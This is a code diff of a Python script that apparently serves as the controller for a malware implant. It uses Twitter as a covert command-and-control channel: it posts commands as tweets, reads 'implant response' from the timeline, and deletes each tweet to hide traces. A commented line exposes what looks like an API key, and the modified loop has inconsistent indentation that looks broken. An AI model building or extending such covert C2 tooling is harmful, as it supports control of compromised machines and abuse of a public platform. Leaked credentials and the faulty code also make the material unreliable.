@@ -13,6 +13,7 @@ auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
 auth.set_access_token(access_token, access_token_secret )
 api = tweepy.API(auth)
 
+app_count = 0
 
 ############################
 #API_KEY = "zLZ2NN1qemQChgVOae3QlgNtp"
@@ -35,18 +36,26 @@ while True:
 		#msg = encode(var) 
 		api.update_status(var)
 		#get and print implant response, might need timing feature
-		time.sleep(15)
+		time.sleep(4)
 		new_public_tweets = api.home_timeline()
-		count = 0
-		
-		while count < 1:
-			for tweet in new_public_tweets:
-				test = str(tweet.text)
-				#bytes = str.encode(test)
-				#type(bytes)	
-				#mess = decode(bytes)
-				print test
-				count = count + 1
+		app_count = app_count + 1
+		for tweet in new_public_tweets:
+			print 'hello' 
+			print tweet.text
+			test = str(tweet.text)
+			#bytes = str.encode(test)
+			#type(bytes)	
+			#mess = decode(bytes)
+			print test
+			api.destroy_status(tweet.id)
+			if app_count == 4:
+        			print "Sleeping for 15 minutes..."
+        		
+        			app_count = 0
+        			sleep(61 * 15)
+        	else: 
+        		continue
+				
 	
 	#delete all posts		
 	#for tweet in new_public_tweets:
